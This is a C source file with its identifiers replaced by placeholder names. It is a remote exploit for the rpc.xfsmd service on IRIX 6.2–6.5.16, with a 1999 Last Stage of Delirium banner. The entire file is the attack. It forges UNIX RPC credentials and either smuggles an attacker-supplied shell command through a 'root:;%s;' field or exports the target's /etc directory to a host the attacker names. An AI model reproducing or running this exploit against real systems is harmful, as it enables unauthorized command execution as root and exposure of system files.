
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_9__ TYPE_3__ ;
typedef struct TYPE_8__ TYPE_2__ ;
typedef struct TYPE_7__ TYPE_1__ ;


struct timeval {int member_0; int member_1; } ;
struct TYPE_7__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct hostent {int h_name; int h_addr; } ;
struct TYPE_8__ {int errno; } ;
typedef TYPE_2__ res_t ;
typedef char* req_t ;
typedef enum clnt_stat { ____Placeholder_clnt_stat } clnt_stat ;
struct TYPE_9__ {int cl_auth; } ;
typedef TYPE_3__ CLIENT ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int ,int ,int ,int ,int *) ;
 int FUNC_2 (TYPE_3__*,int ,int ,void*,int ,void*,struct timeval) ;
 int FUNC_3 (char*) ;
 int FUNC_4 (TYPE_3__*,char*) ;
 TYPE_3__* FUNC_5 (struct sockaddr_in*,int ,int ,int*,int ,int ) ;
 int VAR_7 ;
 int FUNC_6 (int) ;
 struct hostent* FUNC_7 (char*,int,int ) ;
 struct hostent* FUNC_8 (char*) ;
 int FUNC_9 (int,char**,char*) ;
 int FUNC_10 (int) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (int*,int ,int) ;
 char* VAR_8 ;
 int FUNC_13 (char*) ;
 int FUNC_14 (char*,...) ;
 int FUNC_15 (char*,char*,char*,...) ;
 int FUNC_16 (int ,char*) ;
 scalar_t__ FUNC_17 (int ,char) ;
 int VAR_9 ;
 int VAR_10 ;

FUNC_18(int VAR_11,char **VAR_12){
    char VAR_13[10000],*VAR_14,*VAR_15,*VAR_16=((void*)0),*VAR_17="/etc";
    int VAR_18,VAR_19=0,VAR_20=0,VAR_21;
    CLIENT *VAR_22;enum clnt_stat VAR_23;
    struct hostent *VAR_24;
    struct sockaddr_in VAR_25;
    struct timeval VAR_26={10,0};
    req_t VAR_27;
    res_t VAR_28;

    FUNC_14("copyright LAST STAGE OF DELIRIUM Sep 1999 poland  //lsd-pl.net/\n");
    FUNC_14("rpc.xfsmd for irix 6.2 6.3 6.4 6.5 6.5.16 IP:all\n\n");

    if(VAR_11<3){
        FUNC_14("usage: %s address -c \"command\" [-p port]\n",VAR_12[0]);
        FUNC_14("       %s address -e address [-d dir] [-p port]\n",VAR_12[0]);
        FUNC_6(-1);
    }
    while((VAR_21=FUNC_9(VAR_11-1,&VAR_12[1],"c:p:e:d:"))!=-1){
  switch(VAR_21){
  case 'c': VAR_20=0;VAR_15=VAR_8;break;
         case 'e': VAR_20=1;VAR_16=VAR_8;break;
         case 'd': VAR_17=VAR_8;break;
         case 'p': VAR_19=FUNC_0(VAR_8);
  }
    }

    VAR_27=VAR_13;
    if(!VAR_20){
        FUNC_14("executing %s command... ",VAR_15);
        FUNC_15(VAR_27,"XFS_MNT_DIR:/tmp\nroot:;%s;",VAR_15);
    }else{
        FUNC_14("exporting %s directory to %s... ",VAR_17,VAR_16);
        FUNC_15(VAR_27,"XFS_FS_NAME:%s\nroot:%s\n",VAR_17,VAR_16);
    }

    VAR_25.sin_family=VAR_0;
    VAR_25.sin_port=FUNC_10(VAR_19);
    if((VAR_25.sin_addr.s_addr=FUNC_11(VAR_12[1]))==-1){
        if((VAR_24=FUNC_8(VAR_12[1]))==((void*)0)){
            VAR_7=VAR_1;FUNC_13("error");FUNC_6(-1);
        }
        FUNC_12(&VAR_25.sin_addr.s_addr,VAR_24->h_addr,4);
    }else{
        if((VAR_24=FUNC_7((char*)&VAR_25.sin_addr.s_addr,4,VAR_0))==((void*)0)){
            VAR_7=VAR_1;FUNC_13("error");FUNC_6(-1);
        }
    }
    if((VAR_14=(char*)FUNC_17(VAR_24->h_name,'.'))!=((void*)0)) *(VAR_14+1)=0;
    else FUNC_16(VAR_24->h_name,".");

    VAR_18=VAR_2;
    if(!(VAR_22=FUNC_5(&VAR_25,VAR_5,VAR_6,&VAR_18,0,0))){
        FUNC_3("error");FUNC_6(-1);
    }

    VAR_22->cl_auth=FUNC_1(VAR_24->h_name,0,0,0,((void*)0));
    VAR_23=FUNC_2(VAR_22,VAR_4,VAR_9,(void*)&VAR_27,VAR_10,(void*)&VAR_28,VAR_26);
    if(VAR_23!=VAR_3) {FUNC_4(VAR_22,"error");FUNC_6(-1);}
    FUNC_14("%s\n",(!VAR_20)?"ok":((!VAR_28.errno)?"ok":"failed"));
}
